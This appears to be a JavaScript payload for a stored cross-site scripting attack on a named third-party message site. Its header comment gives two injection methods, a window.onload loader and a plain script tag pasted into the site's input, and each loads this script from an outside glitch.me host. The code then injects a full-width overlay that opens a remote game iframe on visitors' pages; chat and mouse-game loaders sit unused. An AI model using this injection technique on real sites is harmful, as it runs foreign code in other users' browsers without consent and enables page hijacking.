/*

Works in: https://sayanything.ml/edit/hack.html

Method 1:

<script>
window.onload = function() {
  if(window['forcestop']) return;

  var script = document.createElement("script");
  script.src = 'https://dmdassc.glitch.me/scripts/sayanything-2.js';
  script.id = 'dmdassc-script';
  document.body.prepend(script);
};
</script>

Method 2:

Add to input

<script id="dmdassc-script-2" src="https://dmdassc.glitch.me/scripts/sayanything-2.js"></script>

Then submit

*/

async function main()
{
  document.querySelectorAll("#dmdassc-script").forEach((s) => s.remove());
  document.querySelectorAll("#dmdassc-script-2").forEach((s) => s.remove());

  //initChat();
  //initMouseGame();
  initGame();
}

function initChat()
{
  var div = document.createElement("div");
  div.id = 'chat-container'
  div.style.position = 'fixed';
  div.style.bottom = '0';
  div.style.left = '0';
  div.style.width = '100%';
  div.style.height = 'auto';

  var img = document.createElement('img');
  img.src = 'https://cms.evup.com.br/api/assets/ecommerce/eaadf1ec-f313-4a27-80da-9a5f173bb024/chat-button.png?sq=48222262-d0cf-36bc-996f-0839304e835d'
  img.style.width = '40px';
  img.style.cursor = 'pointer';
  img.onclick = function()
  {
    var iframe = document.createElement('iframe');
    iframe.src = 'https://dmdassc.glitch.me/chat';
    iframe.style.width = '100%';
    iframe.style.height = '100%';

    div.style.height = '30%';

    img.remove();
    div.appendChild(iframe);
  }


  div.appendChild(img);

  document.body.appendChild(div);
}

function initMouseGame()
{
  var script = document.createElement('script');
  script.src = 'https://dmdassc.glitch.me/assets/mousegame/main.js';
  document.body.appendChild(script);
}

function initGame()
{
  var div = document.createElement("div");
  div.id = 'game-container'
  div.style.position = 'fixed';
  div.style.bottom = '0';
  div.style.left = '0';
  div.style.width = '100%';
  div.style.height = 'auto';
  div.style.filter = 'invert(1)';

  var img = document.createElement('img');
  img.src = 'https://dmdassc.glitch.me/static/phaser/assets/play.png'
  img.style.width = '120px';
  img.style.cursor = 'pointer';
  img.onclick = function()
  {
    var iframe = document.createElement('iframe');
    iframe.src = 'https://dmdassc.glitch.me/game';
    iframe.style.width = '100%';
    iframe.style.height = '100%';

    div.style.width = '100%';
    div.style.height = window.outerHeight;

    img.remove();
    div.appendChild(iframe);
  }


  div.appendChild(img);

  document.body.appendChild(div);
}

try {
  main();
} catch (error) {
  console.error(error);
}